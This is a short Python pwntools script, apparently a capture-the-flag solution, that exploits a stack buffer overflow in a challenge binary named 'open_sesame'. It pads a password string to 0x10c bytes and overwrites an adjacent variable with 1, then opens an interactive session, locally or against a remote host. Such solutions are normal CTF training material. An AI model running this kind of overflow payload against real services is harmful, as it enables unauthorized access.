#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./open_sesame")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

pad = 0x110 - 0x4
payload = flat(b"OpenSesame!!!\x00", length=pad) + p32(1)

io.sendlineafter(b"cave?\n", payload)

io.interactive()
